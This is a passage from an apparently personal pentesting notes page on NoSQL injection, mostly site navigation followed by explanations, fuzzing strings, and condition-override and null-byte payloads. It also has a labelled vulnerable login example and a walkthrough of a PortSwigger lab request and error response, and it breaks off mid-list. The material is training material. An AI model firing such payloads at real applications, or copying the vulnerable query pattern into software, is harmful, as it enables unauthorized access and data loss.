+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodologies/infrastructure/external-network-pentesting.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    External Network Testing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodologies/infrastructure/internal-network-pentesting.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Internal Network Pentesting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3_2" id="__nav_4_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web apps
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Web apps
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodologies/web-apps/owasp-wstg.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OWASP WSTG
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#understanding-nosql-structure" class="md-nav__link">
+    <span class="md-ellipsis">
+      Understanding NoSQL Structure
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Understanding NoSQL Structure">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sample-document" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sample Document
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sample-vulnerable-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sample Vulnerable Code
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-injection-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Injection Test
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#syntax-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Syntax Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Syntax Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection-and-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection and Fuzzing
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection and Fuzzing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sample-fuzzing-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sample Fuzzing String
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url-encoded-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      URL-Encoded Fuzzing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#json-context-fuzzing" class="md-nav__link">
+    <span class="md-ellipsis">
+      JSON Context Fuzzing
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#confirming-conditional-behavior" class="md-nav__link">
+    <span class="md-ellipsis">
+      Confirming Conditional Behavior
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Confirming Conditional Behavior">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#testing-false-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing False Conditions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#testing-true-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Testing True Conditions
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-syntax-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting Syntax Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploiting Syntax Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#override-existing-conditions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Override Existing Conditions
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#null-character-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Null Character Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-1-detecting-nosql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lab 1: Detecting NoSQL injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#operator-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Operator Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Operator Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#response-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Response Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#basic-operator-injection-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Operator Injection Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Operator Injection Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-parameter-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      GET Parameter Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-json-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      POST JSON Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Authentication Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-2-exploiting-nosql-operator-injection-to-bypass-authentication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lab 2: Exploiting NoSQL operator injection to bypass authentication
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sample-code-solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sample Code Solution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Sample Code Solution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#curl" class="md-nav__link">
+    <span class="md-ellipsis">
+      Curl
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#data-extraction-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Data Extraction Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Data Extraction Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#identifying-field-names" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identifying Field Names
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extracting-data-with-syntax-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Extracting Data with Syntax Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Extracting Data with Syntax Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#character-by-character-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Character-by-Character Extraction
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-javascript-functions" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using JavaScript Functions
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lab-3-exploiting-nosql-injection-to-extract-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      Lab 3: Exploiting NoSQL injection to extract data
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-operator-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Operator Injection
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Operator Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-where-to-confirm-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using $where to Confirm Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#extracting-field-names-with-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      Extracting Field Names with keys()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#data-exfiltration-with-operators" class="md-nav__link">
+    <span class="md-ellipsis">
+      Data Exfiltration with Operators
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#timing-based-attacks-blind-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Timing-Based Attacks (Blind Injection)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Timing-Based Attacks (Blind Injection)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-timing-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Timing Payloads
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Basic Timing Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-while-loop-for-delays" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using while Loop for Delays
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-sleep-function" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using sleep Function
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prevention" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prevention
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practice-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      Practice Resources
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practice Resources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-owasp-juice-shop" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. OWASP Juice Shop
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-portswigger-web-security-academy" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. PortSwigger Web Security Academy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-nosqlgoat" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. NoSQLGoat
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-hack-the-box-tryhackme" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Hack The Box &amp; TryHackMe
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  <!--
+  Copyright (c) 2016-2024 Martin Donath <martin.donath@squidfunk.com>
+
+  Permission is hereby granted, free of charge, to any person obtaining a copy
+  of this software and associated documentation files (the "Software"), to
+  deal in the Software without restriction, including without limitation the
+  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
+  sell copies of the Software, and to permit persons to whom the Software is
+  furnished to do so, subject to the following conditions:
+
+  The above copyright notice and this permission notice shall be included in
+  all copies or substantial portions of the Software.
+
+  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+  FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
+  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+  FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+  IN THE SOFTWARE.
+-->
+
+<!-- Content -->
+<article class="md-content__inner md-typeset">
+  
+  <!-- Dynamic target input for pages that have the dynamic_target metadata -->
+  
+
+  <!-- Page content -->
+  <h1 id="nosql-injection">NoSQL Injection<a class="headerlink" href="#nosql-injection" title="Permanent link">&para;</a></h1>
+<p>Most of these notes were taken from online sources and/or courses. I'm not that smart to come up with all this on my own. The primary source was PortSwigger. Check out their <a href="https://portswigger.net/web-security/learning-paths/nosql-injection">NoSQL Injection learning path</a> on the Web Security Academy.</p>
+<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h2>
+<p>There are two different types of NoSQL injection:</p>
+<ul>
+<li><strong>Syntax injection</strong> - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.</li>
+<li><strong>Operator injection</strong> - This occurs when you can use NoSQL query operators to manipulate queries.</li>
+</ul>
+<h2 id="understanding-nosql-structure">Understanding NoSQL Structure<a class="headerlink" href="#understanding-nosql-structure" title="Permanent link">&para;</a></h2>
+<h3 id="sample-document">Sample Document<a class="headerlink" href="#sample-document" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;some_unique_user_id_123&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;alex_p_dev&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;alex@example.com&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;followers&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">150</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;interests&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;pentesting&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;bug bounties&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;rock climbing&quot;</span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="sample-vulnerable-code">Sample Vulnerable Code<a class="headerlink" href="#sample-vulnerable-code" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// WARNING: VULNERABLE CODE EXAMPLE</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">login</span><span class="p">(</span><span class="nx">userInput_username</span><span class="p">,</span><span class="w"> </span><span class="nx">userInput_password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="c1">// Build a query by directly inserting user input</span>
+<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`{ &quot;username&quot;: &quot;`</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">userInput_username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sb">`&quot;, &quot;password&quot;: &quot;`</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">userInput_password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sb">`&quot; }`</span><span class="p">;</span>
+
+<span class="w">  </span><span class="c1">// Find a user in the database that matches this query</span>
+<span class="w">  </span><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">query</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="basic-injection-test">Basic Injection Test<a class="headerlink" href="#basic-injection-test" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"> </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;a&quot;</span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+<p>The database reads this as: "Find a user where the <code>username</code> is 'admin' AND the <code>password</code> is <strong>not equal to 'a'</strong>."</p>
+<h2 id="syntax-injection">Syntax Injection<a class="headerlink" href="#syntax-injection" title="Permanent link">&para;</a></h2>
+<p>Syntax injection attempts to break the NoSQL query syntax by injecting malicious payloads.</p>
+<h3 id="detection-and-fuzzing">Detection and Fuzzing<a class="headerlink" href="#detection-and-fuzzing" title="Permanent link">&para;</a></h3>
+<h4 id="sample-fuzzing-string">Sample Fuzzing String<a class="headerlink" href="#sample-fuzzing-string" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>&#39;&quot;`{ ;$Foo} $Foo \xYZ
+</code></pre></div>
+<h4 id="url-encoded-fuzzing">URL-Encoded Fuzzing<a class="headerlink" href="#url-encoded-fuzzing" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/product/lookup?category=&#39;%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+</code></pre></div>
+<h4 id="json-context-fuzzing">JSON Context Fuzzing<a class="headerlink" href="#json-context-fuzzing" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>&#39;\&quot;`{\r;$Foo}\n$Foo \\xYZ\u0000
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>To figure out which characters are processed, send individual characters to see how the application responds.</p>
+</div>
+<h3 id="confirming-conditional-behavior">Confirming Conditional Behavior<a class="headerlink" href="#confirming-conditional-behavior" title="Permanent link">&para;</a></h3>
+<p>After identifying the vulnerability, try to determine which characters are being processed.</p>
+<h4 id="testing-false-conditions">Testing False Conditions<a class="headerlink" href="#testing-false-conditions" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>&#39; &amp;&amp; 0 &amp;&amp; &#39;x
+</code></pre></div>
+<h4 id="testing-true-conditions">Testing True Conditions<a class="headerlink" href="#testing-true-conditions" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>&#39; &amp;&amp; 1 &amp;&amp; &#39;x
+</code></pre></div>
+<p>If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.</p>
+<h3 id="exploiting-syntax-injection">Exploiting Syntax Injection<a class="headerlink" href="#exploiting-syntax-injection" title="Permanent link">&para;</a></h3>
+<h4 id="override-existing-conditions">Override Existing Conditions<a class="headerlink" href="#override-existing-conditions" title="Permanent link">&para;</a></h4>
+<p>Attempt to override existing conditions with custom JavaScript:</p>
+<div class="highlight"><pre><span></span><code>&#39;||&#39;1&#39;==&#39;1
+</code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.</p>
+</div>
+<h4 id="null-character-injection">Null Character Injection<a class="headerlink" href="#null-character-injection" title="Permanent link">&para;</a></h4>
+<p>Try injecting a null character after the query:</p>
+<div class="highlight"><pre><span></span><code>https://insecure-website.com/product/lookup?category=fizzy&#39;%00
+</code></pre></div>
+<details class="example">
+<summary>PortSwigger NoSQL Injection Lab 1: Detecting NoSQL injection</summary>
+<h3 id="lab-1-detecting-nosql-injection">Lab 1: Detecting NoSQL injection<a class="headerlink" href="#lab-1-detecting-nosql-injection" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>GET /filter?category=Pets&#39;%22%60%7B%20%3B%24Foo%7D%20%24Foo%20%5CxYZ HTTP/1.1
+Host: 0a8c001604495d9180c60dd0006c004a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Connection: keep-alive
+Referer: https://0a8c001604495d9180c60dd0006c004a.web-security-academy.net/
+Cookie: session=d82ldTNqdPOXGQFfW3TXmFcwNInibcG3
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-PwnFox-Color: magenta
+Priority: u=0, i
+</code></pre></div>
+<p>This causes an internal server error</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 2793
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+    &lt;link href=/resources/css/labs.css rel=stylesheet&gt;
+    &lt;title&gt;Detecting NoSQL injection&lt;/title&gt;
+&lt;/head&gt;
+&lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+&lt;div id=&quot;academyLabHeader&quot;&gt;
+    &lt;section class=&#39;academyLabBanner&#39;&gt;
+        &lt;div class=container&gt;
+            &lt;div class=logo&gt;&lt;/div&gt;
+            &lt;div class=title-container&gt;
+                &lt;h2&gt;Detecting NoSQL injection&lt;/h2&gt;
+                &lt;a id=&#39;lab-link&#39; class=&#39;button&#39; href=&#39;/&#39;&gt;Back to lab home&lt;/a&gt;
+                &lt;a class=link-back href=&#39;https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection&#39;&gt;
+                    Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;description&amp;nbsp;
+                    &lt;svg version=1.1 id=Layer_1 xmlns=&#39;http://www.w3.org/2000/svg&#39; xmlns:xlink=&#39;http://www.w3.org/1999/xlink&#39; x=0px y=0px viewBox=&#39;0 0 28 30&#39; enable-background=&#39;new 0 0 28 30&#39; xml:space=preserve title=back-arrow&gt;
+                        &lt;g&gt;
+                            &lt;polygon points=&#39;1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15&#39;&gt;&lt;/polygon&gt;
+                            &lt;polygon points=&#39;14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15&#39;&gt;&lt;/polygon&gt;
+                        &lt;/g&gt;
+                    &lt;/svg&gt;
+                &lt;/a&gt;
+            &lt;/div&gt;
+            &lt;div class=&#39;widgetcontainer-lab-status is-notsolved&#39;&gt;
+                &lt;span&gt;LAB&lt;/span&gt;
+                &lt;p&gt;Not solved&lt;/p&gt;
+                &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+&lt;/div&gt;
+&lt;/section&gt;
+&lt;/div&gt;
+&lt;div theme=&quot;&quot;&gt;
+    &lt;section class=&quot;maincontainer&quot;&gt;
+        &lt;div class=&quot;container is-page&quot;&gt;
+            &lt;header class=&quot;navigation-header&quot;&gt;
+            &lt;/header&gt;
+            &lt;h4&gt;Internal Server Error&lt;/h4&gt;
+            &lt;p class=is-warning&gt;Command failed with error 139 (JSInterpreterFailure): &amp;apos;SyntaxError: malformed hexadecimal character escape sequence :
+                functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
+                &amp;apos; on server 127.0.0.1:27017. The full response is {&amp;quot;ok&amp;quot;: 0.0, &amp;quot;errmsg&amp;quot;: &amp;quot;SyntaxError: malformed hexadecimal character escape sequence :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&amp;quot;, &amp;quot;code&amp;quot;: 139, &amp;quot;codeName&amp;quot;: &amp;quot;JSInterpreterFailure&amp;quot;}&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre></div>
+<p>Note that sending a <code>'</code> character results in an error</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085013.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085013.png" /></a></p>
+<p>Sending a valid JS payload fixes the error</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085026.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085026.png" /></a></p>
+<p>Check conditional behavior. Note that when we send a negative conditional, no products are shown</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085044.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085044.png" /></a></p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Make sure to URL encode this</p>
+</div>
+<p>Now when we send a truthy value, products are returned.</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085117.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085117.png" /></a></p>
+<p>Now sending an "or 1=1" payload we can get all products listed</p>
+<p><a class="glightbox" href="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085130.png" data-type="image" data-width="auto" data-height="auto" data-desc-position="bottom"><img alt="" src="../../../../assets/screenshots/nosql/Pasted%20image%2020250727085130.png" /></a></p>
+<p>Final payload</p>
+<div class="highlight"><pre><span></span><code>&#39;||1||&#39;
+</code></pre></div>
+</details>
+<h2 id="operator-injection">Operator Injection<a class="headerlink" href="#operator-injection" title="Permanent link">&para;</a></h2>
+<p>NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:</p>
+<ul>
+<li><code>$where</code> - Matches documents that satisfy a JavaScript expression.</li>
+<li><code>$ne</code> - Matches all values that are not equal to a specified value.</li>
+<li><code>$gt</code> (greater than) and <code>$lt</code> (less than) are perfect. For instance, if you're trying to bypass a check on a numeric field, you could inject <code>{"$gt": 0}</code> to match any positive number.</li>
+<li><code>$in</code> is great for checking against an array of possibilities.</li>
+<li><code>$regex</code> is extremely powerful, as it lets you perform complex pattern matching. It can be used to slowly reveal data one character at a time.</li>
+<li><code>$where</code>: This is a very dangerous one. In older versions of MongoDB, it allowed you to pass a JavaScript function to be executed on the server. Finding this is like hitting the jackpot.</li>
+<li><code>$exists</code>: This checks if a field exists or not, which can be useful for figuring out the database schema.</li>
+</ul>
+<h3 id="response-analysis">Response Analysis<a class="headerlink" href="#response-analysis" title="Permanent link">&para;</a></h3>
+<p>Sending the payload is only half the battle. A professional pentester needs to carefully observe how the application responds to confirm a vulnerability. You're looking for three main types of clues:</p>
+<ol>
+<li>
+<p><strong>Direct Response / Content Change:</strong> This is the easiest to spot. You inject a payload that evaluates to true, and the content of the page changes. For example, you bypass a login and see a "Welcome, admin!" message, or a search for <code>"a'"</code> returns more results than a search for <code>"a"</code>.</p>
+</li>
+<li>
